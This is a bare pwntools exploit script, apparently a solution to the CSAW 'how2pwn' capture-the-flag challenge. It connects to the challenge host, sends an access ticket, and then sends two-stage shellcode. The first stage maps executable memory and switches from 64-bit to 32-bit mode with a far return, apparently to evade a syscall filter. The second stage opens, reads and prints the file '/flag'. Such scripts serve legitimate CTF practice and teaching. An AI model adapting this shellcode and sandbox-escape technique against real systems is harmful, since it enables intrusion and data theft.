ticket = b"8e7bd9e37e38a85551d969e29b77e1ce"


from pwn import *

context.arch = 'amd64'
context.bits = 64

stage1_shellcode = f'''

xor rax,rax
mov al, 9
mov rdi,0xcafe000
mov rsi,0x2000
mov rdx,0x7
mov r10,0x21
xor r8,r8
xor r9,r9
syscall

xor rax,rax
mov al, 9
mov rdi,0xdead000
mov rsi,0x2000
mov rdx,0x7
mov r10,0x21
xor r8,r8
xor r9,r9
syscall


xor rax, rax
xor rdi,rdi
mov rsi,0xcafe000
mov rdx,0x1000
syscall

xor rax, rax
mov al, 0xb

xor ebx, ebx
mov ebx, 0xcafe000
xor ecx, ecx
xor edx, edx

int 0x80

mov rbx,0x2300000000
mov rax, 0xcafe000
xor rax, rbx
push rax
retf

'''

shellasm = asm(stage1_shellcode)
print("Length: ",len(shellasm))


context.arch='i386'
context.bits=32
flag_path_1 = hex(u32(b"/fla"))
flag_path_2 = hex(u32(b"g\0\0\0"))
shellcode=f'''
mov esp, 0xcaff000
mov eax, 0x5
push {flag_path_2}
push {flag_path_1}
mov ebx,esp
xor ecx,ecx
xor edx,edx
int 0x80

mov ebx,eax
mov al,0x3
mov ecx,0xdead000
mov edx,0x1500
int 0x80

mov eax, 0x4
mov ebx, 0x1
mov ecx, 0xdead000
mov edx, 0x1500
int 0x80
'''

p =  remote("how2pwn.chal.csaw.io",60003)
#p = process("bin/chal1")
import time
p.send(ticket)
time.sleep(1)
p.send(shellasm)
time.sleep(1)
p.send(asm(shellcode))
p.interactive()